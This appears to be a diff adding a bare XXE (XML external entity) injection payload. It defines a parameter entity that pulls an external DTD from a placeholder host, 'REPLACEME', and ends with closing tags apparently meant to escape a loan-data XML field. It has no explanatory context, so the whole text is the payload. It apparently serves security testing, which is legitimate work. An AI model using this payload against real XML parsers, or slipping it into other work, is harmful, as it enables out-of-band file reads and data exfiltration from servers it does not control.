@@ -1,0 +1,4 @@
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY % xxe SYSTEM "http://REPLACEME/xxe.dtd"> %xxe; ]>
+<foo></foo></@html_entities></loanDataXml>
